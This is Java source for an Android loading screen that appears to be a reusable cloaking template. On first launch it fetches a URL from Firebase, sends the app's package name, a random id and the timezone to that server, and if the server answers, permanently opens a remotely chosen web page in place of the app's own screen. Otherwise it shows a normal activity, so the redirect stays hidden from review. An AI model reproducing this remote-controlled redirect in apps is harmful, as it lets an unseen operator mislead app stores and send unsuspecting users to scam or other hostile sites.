package com.template;

import androidx.activity.OnBackPressedDispatcher;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabColorSchemeParams;
import androidx.browser.customtabs.CustomTabsCallback;
import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;
import androidx.core.content.ContextCompat;
import androidx.browser.customtabs.CustomTabsIntent;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.messaging.FirebaseMessaging;

import java.io.IOException;
import java.util.Calendar;
import java.util.UUID;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class LoadingActivity extends AppCompatActivity {
    private static final String TAG = "LoadingActivity";
    private SharedPreferences sharedPrefs;
    private DatabaseReference mDatabase;
    private static final String CUSTOM_TAB_PACKAGE_NAME = "com.android.chrome";

    private CustomTabsClient customTabsClient;
    private CustomTabsServiceConnection customTabsServiceConnection;
    private CustomTabsCallback customTabsCallback;
    private CustomTabsSession customTabsSession;
    private final ActivityResultLauncher<String> requestPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    Toast.makeText(this, "Notifications permission granted", Toast.LENGTH_SHORT)
                            .show();
                } else {
                    Toast.makeText(this, "FCM can't post notifications without POST_NOTIFICATIONS permission",
                            Toast.LENGTH_LONG).show();
                }
                InitMain();
            });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loading);

        AskNotificationPermission();
        InitFMC();
    }

    private void InitMain() {
        new Thread(() -> {
            boolean networkAvailable = IsNetworkAvailable();
            sharedPrefs = getSharedPreferences("my_sp", MODE_PRIVATE);
            boolean spInitialized = sharedPrefs.contains("initialized");

            Log.d("firebase", networkAvailable ? "Network available" : "Network not available");
            Log.d("firebase", spInitialized ? "SP initialized" : "SP not initialized");

            if (!networkAvailable) {
                OpenMainActivity();
            } else {
                if (spInitialized) {
                    ProceedSubsequentLaunch();
                } else {
                    ProceedFirstLaunch();
                }
            }
        }).start();
    }

    private void InitFMC() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = getString(R.string.default_notification_channel_id);
            String channelName = getString(R.string.default_notification_channel_name);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(new NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW));
        }

        if (getIntent().getExtras() != null) {
            for (String key : getIntent().getExtras().keySet()) {
                Object value = getIntent().getExtras().get(key);
                Log.d(TAG, "Key: " + key + " Value: " + value);
            }
        }

        FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(task -> {
                    if (!task.isSuccessful()) {
                        Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                        return;
                    }

                    // Get new FCM registration token
                    String token = task.getResult();

                    // Log and toast
                    String msg = token;
                    Log.d(TAG, msg);
                });
    }

    private void AskNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
                InitMain();
            } else {
                requestPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS);
            }
        }
    }

    private void ProceedFirstLaunch() {
        mDatabase = FirebaseDatabase.getInstance().getReference();
        mDatabase.child("db").child("link").get().addOnCompleteListener(task -> {
            SharedPreferences.Editor ed = sharedPrefs.edit();
            Object firestoreUrl = task.getResult().getValue();

            Log.d("firebase", firestoreUrl == null ? "firestore_url is null" : "firestore_url is " + firestoreUrl);

            ed.putBoolean("initialized", true);

            if (firestoreUrl == null) {
                ed.apply();
                OpenMainActivity();
            } else {
                ed.putString(getString(R.string.firestore_url), firestoreUrl.toString());
                ed.apply();

                ProceedFirestoreUrl(firestoreUrl.toString());
            }
        });
    }

    private void ProceedSubsequentLaunch() {
        //Проверка есть ли firestore в sp
        if (!sharedPrefs.contains(getString((R.string.firestore_url))) || !sharedPrefs.contains(getString((R.string.final_url)))) {
            OpenMainActivity();
        } else {
            OpenCCT(sharedPrefs.getString(getString(R.string.final_url), ""));
        }
    }

    private void ProceedFirestoreUrl(String firestoreUrl) {
        //Сделать запрос на сайт
        OkHttpClient client = new OkHttpClient();
        String requestUrl = String.format("%s/?packageid=%s&usserid=%s&getz=%s&getr=utm_source=google-play&utm_medium=organic",
                firestoreUrl,
                this.getPackageName(),
                UUID.randomUUID(),
                Calendar.getInstance().getTimeZone().getID());

        Request request = new Request.Builder()
                .url(requestUrl)
                .header("user-agent", System.getProperty("http.agent"))
                .header("ngrok-skip-browser-warning", "0")
                .build();

        //получить finalUrl
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                String serverAnswer = response.body().string();
                Log.d("firebase", "Server response is " + serverAnswer);

                runOnUiThread(() -> {
                    if (response.code() == 200) {
                        SharedPreferences.Editor ed = sharedPrefs.edit();
                        ed.putString(getString(R.string.final_url), serverAnswer);
                        ed.apply();

                        OpenCCT(serverAnswer);
                    } else {
                        OpenMainActivity();
                    }
                });
            }

            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                e.printStackTrace();
            }
        });
    }

    /**
     * Проверка доступности интернета через DNS Google
     */
    private boolean IsNetworkAvailable() {
        Runtime runtime = Runtime.getRuntime();
        try {
            Process ipProcess = runtime.exec("/system/bin/ping -c 1 8.8.8.8");
            int exitValue = ipProcess.waitFor();
            return (exitValue == 0);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    private void OpenMainActivity() {
        Intent intent = new Intent(this, MainActivity.class);
        startActivity(intent);

        finish();
    }

    private void OpenCCT(String url) {
        CustomTabsIntent.Builder intentBuilder = new CustomTabsIntent.Builder(customTabsSession);
        CustomTabColorSchemeParams params = new CustomTabColorSchemeParams.Builder()
                .setToolbarColor(ContextCompat.getColor(this, R.color.black))
                .build();

        intentBuilder.setColorSchemeParams(CustomTabsIntent.COLOR_SCHEME_DARK, params);

        CustomTabsIntent customTabsIntent = intentBuilder.build();
        customTabsIntent.intent.setPackage(CUSTOM_TAB_PACKAGE_NAME);

        customTabsIntent.launchUrl(this, Uri.parse(url));

        finish();
    }
}